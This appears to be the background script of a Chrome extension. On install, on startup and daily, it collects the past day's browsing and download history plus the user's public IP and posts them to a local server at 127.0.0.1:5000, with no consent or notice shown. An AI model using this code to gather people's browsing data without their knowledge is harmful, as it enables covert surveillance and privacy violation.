console.log('extension.js running');
let timeInterval = 86400000; // 1 day in milliseconds

async function getIpAddress() {
  const response = await fetch('https://api.ipify.org?format=json');
  const data = await response.json();

  return data.ip;
};

async function getBrowsingHistory() {
  const ip = await getIpAddress();

  return new Promise((resolve, reject) => {
    chrome.history.search({
      text: '',
      startTime: Date.now() - timeInterval,
      endTime: Date.now(),
    }, function(historyItems) {
      const history = historyItems.map((item) => {
        return {
          ip: ip,
          url: item.url,
          title: item.title,
          lastVisitTime: item.lastVisitTime,
          visitCount: item.visitCount,
        };
      });

      resolve(history);
    });
  });
}

async function getDownloadsHistory() {
  const ip = await getIpAddress();

  const downloads = await new Promise((resolve, reject) => {
    chrome.downloads.search({
      startedAfter: new Date(Date.now() - timeInterval).toISOString(),
      endedBefore: new Date(Date.now()).toISOString(),
    }, function(downloadItems) {
      if (chrome.runtime.lastError) {
        reject(chrome.runtime.lastError);
      } else {
        const downloads = downloadItems.map((item) => {
          return {
            ip: ip,
            url: item.url,
            filename: item.filename,
            state: item.state,
          };
        });

        const completedDownloads = downloads.filter((item) => item.state === 'complete');

        resolve(completedDownloads);
      }
    });
  });

  return downloads;
}

async function fetchAndSendData() {
  const ip = await getIpAddress();
  const browsing_history = await getBrowsingHistory();
  const downloads = await getDownloadsHistory();

  console.log(browsing_history);
  console.log(downloads);

  if (browsing_history) {
    await fetch('http://127.0.0.1:5000/browsing_history/', {
      method: 'POST',
      mode: 'cors',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ ip, browsing_history }),
    });
  }

  if (downloads) {
    await fetch('http://127.0.0.1:5000/downloads/', {
      method: 'POST',
      mode: 'cors',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ ip, downloads }),
    });
  }

  console.log('Data sent to server');
};

chrome.runtime.onInstalled.addListener(() => {
  // Create an alarm that triggers every 24 hours
  chrome.alarms.create('dailyAlarm', { periodInMinutes: 1440 });
  fetchAndSendData();
});

chrome.runtime.onStartup.addListener(() => {
  console.log('Start up browser');
  fetchAndSendData();
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === 'dailyAlarm') {
    console.log('Daily alarm triggered');
    // Perform tasks here that you want to run every day
    fetchAndSendData();
  }
});
